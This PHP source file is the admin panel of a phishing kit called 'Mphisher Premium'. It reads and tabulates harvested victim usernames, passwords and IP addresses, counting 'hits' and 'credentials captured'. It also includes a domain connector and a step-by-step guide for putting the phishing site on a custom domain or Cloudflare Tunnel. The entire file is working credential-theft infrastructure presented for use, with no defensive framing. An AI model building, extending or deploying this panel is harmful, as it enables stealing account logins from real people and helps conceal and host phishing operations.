<?php
// Admin Panel for Mphisher
$auth_file = '../auth/usernames.dat';
$ip_file = '../auth/ip.txt';

// Read Credentials
$credentials = [];
if (file_exists($auth_file)) {
    $lines = file($auth_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos($line, 'Account:') !== false) {
            $parts = explode('Password:', $line);
            $user = trim(str_replace('Account:', '', $parts[0]));
            $pass = isset($parts[1]) ? trim($parts[1]) : 'N/A';
            $credentials[] = ['user' => $user, 'pass' => $pass, 'time' => date('Y-m-d H:i')];
        }
    }
}

// Read IPs
$ips = [];
if (file_exists($ip_file)) {
    $lines = file($ip_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos($line, 'IP:') !== false) {
            $ip = trim(str_replace('IP:', '', $line));
            $ips[] = $ip;
        }
    }
}

$total_hits = count($ips);
$total_creds = count($credentials);

// Handle Domain Connection
$domain = "None Connected";
$conn_type = "direct";
$tunnel_token = "";

if (isset($_POST['domain'])) {
    $domain = htmlspecialchars($_POST['domain']);
    $conn_type = htmlspecialchars($_POST['conn_type'] ?? 'direct');
    $tunnel_token = htmlspecialchars($_POST['tunnel_token'] ?? '');
    
    $config_data = [
        'domain' => $domain,
        'conn_type' => $conn_type,
        'tunnel_token' => $tunnel_token,
        'updated_at' => date('Y-m-d H:i:s')
    ];
    file_put_contents('config.json', json_encode($config_data, JSON_PRETTY_PRINT));
} elseif (file_exists('config.json')) {
    $config = json_decode(file_get_contents('config.json'), true);
    $domain = $config['domain'] ?? "None Connected";
    $conn_type = $config['conn_type'] ?? "direct";
    $tunnel_token = $config['tunnel_token'] ?? "";
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mphisher Premium Admin</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">MPHISHER <span style="color: var(--text-secondary); font-weight: 300;">PREMIUM</span></div>
            <div class="status">
                <span class="badge badge-success">System Online</span>
            </div>
        </header>

        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Hits</h3>
                <div class="value"><?php echo $total_hits; ?></div>
            </div>
            <div class="stat-card">
                <h3>Credentials Captured</h3>
                <div class="value"><?php echo $total_creds; ?></div>
            </div>
            <div class="stat-card">
                <h3>Active Domain</h3>
                <div class="value" style="font-size: 1.2rem; margin-top: 10px; color: var(--accent-primary);"><?php echo $domain; ?></div>
            </div>
        </div>

        <div class="main-content">
            <div class="panel">
                <h2>Captured Credentials</h2>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Username / Email</th>
                                <th>Password</th>
                                <th>Timestamp</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (empty($credentials)): ?>
                                <tr>
                                    <td colspan="4" style="text-align: center; color: var(--text-secondary);">No data captured yet.</td>
                                </tr>
                            <?php else: ?>
                                <?php foreach (array_reverse($credentials) as $cred): ?>
                                    <tr>
                                        <td style="font-weight: 600; color: var(--accent-primary);"><?php echo $cred['user']; ?></td>
                                        <td><code><?php echo $cred['pass']; ?></code></td>
                                        <td style="color: var(--text-secondary);"><?php echo $cred['time']; ?></td>
                                        <td><span class="badge badge-success">Valid</span></td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="side-panel">
                <div class="domain-connector">
                    <h3>Domain Connector</h3>
                    <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 10px 0;">Configure how your custom domain connects to this panel.</p>
                    <form method="POST">
                        <div class="input-group">
                            <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Connection Type</label>
                            <select name="conn_type" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); padding: 0.8rem; border-radius: 10px; color: white; margin-bottom: 1rem; outline: none;">
                                <option value="direct" <?php echo $conn_type == 'direct' ? 'selected' : ''; ?>>Direct (A Record / IP)</option>
                                <option value="tunnel" <?php echo $conn_type == 'tunnel' ? 'selected' : ''; ?>>Cloudflare Tunnel (Secure)</option>
                            </select>

                            <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Custom Domain</label>
                            <input type="text" name="domain" placeholder="example.com" value="<?php echo $domain != 'None Connected' ? $domain : ''; ?>">
                            
                            <div id="tunnel-field" style="display: <?php echo $conn_type == 'tunnel' ? 'block' : 'none'; ?>;">
                                <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Cloudflare Tunnel Token</label>
                                <input type="text" name="tunnel_token" placeholder="eyJhIjoi..." value="<?php echo $tunnel_token; ?>">
                            </div>

                            <button type="submit" class="btn">Save & Connect</button>
                        </div>
                    </form>
                </div>

                <script>
                    document.querySelector('select[name="conn_type"]').addEventListener('change', function() {
                        document.getElementById('tunnel-field').style.display = this.value === 'tunnel' ? 'block' : 'none';
                    });
                </script>

                <div class="panel" style="padding: 1.5rem;">
                    <h3>Recent Visitors</h3>
                    <div style="margin-top: 1rem;">
                        <?php foreach (array_slice(array_reverse($ips), 0, 5) as $ip): ?>
                            <div style="display: flex; justify-content: space-between; margin-bottom: 0.8rem; font-size: 0.9rem;">
                                <span><?php echo $ip; ?></span>
                                <span style="color: var(--accent-primary);">Just now</span>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <div class="panel" style="padding: 1.5rem; margin-top: 1.5rem;">
                    <h3>Domain Setup Guide</h3>
                    <div style="margin-top: 1rem; font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6;">
                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Cloudflare Tunnel (Recommended):</strong></p>
                        <ol style="margin-left: 20px; margin-bottom: 15px;">
                            <li>Go to Cloudflare Zero Trust Dashboard.</li>
                            <li>Navigate to <strong>Networks > Tunnels</strong>.</li>
                            <li>Create a new Tunnel and copy the <strong>Token</strong>.</li>
                            <li>Paste the token above and save.</li>
                        </ol>
                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Direct A Record:</strong></p>
                        <ol style="margin-left: 20px;">
                            <li>Go to your Domain DNS settings.</li>
                            <li>Add an <strong>A Record</strong> pointing to your server's Public IP.</li>
                            <li>Wait for DNS propagation (up to 24h).</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Simple auto-refresh mock
        // setInterval(() => window.location.reload(), 10000);
    </script>
</body>
</html>
